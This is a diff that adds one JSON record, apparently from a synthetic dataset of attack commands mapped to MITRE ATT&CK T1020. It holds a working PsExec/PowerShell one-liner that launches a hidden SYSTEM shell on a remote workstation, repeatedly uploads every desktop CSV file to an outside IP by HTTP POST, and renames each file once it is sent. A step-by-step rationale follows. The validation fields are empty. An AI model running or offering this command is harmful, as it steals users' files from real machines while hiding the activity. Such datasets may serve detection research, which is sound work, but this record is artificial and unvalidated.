@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec \\\\WS-23 -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; while ($true){ Get-ChildItem 'C:\\Users\\*\\Desktop' -Filter *.csv -Recurse -File | ForEach-Object { Invoke-RestMethod -Uri 'https://198.51.100.88/ingest' -Method Post -InFile $_.FullName -ContentType 'text/csv' | Out-Null; if ($?) { Rename-Item -Force $_.FullName ($_.FullName + '.sent') } }; Start-Sleep 900 }\"",
+  "explanation": "Uses PSExec to remotely launch a hidden SYSTEM PowerShell on WS-23 that automatically exfiltrates CSV files via HTTP POST and marks them by renaming.",
+  "rationale_steps": [
+    "Remotely execute hidden PowerShell as SYSTEM on the target host using PSExec.",
+    "Enumerate CSV files from user desktops.",
+    "POST each file to a remote ingest API using Invoke-RestMethod without verbose output.",
+    "Rename files with a .sent suffix to mark completion and avoid repeats.",
+    "Sleep and repeat to maintain automation."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-93d97d37",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
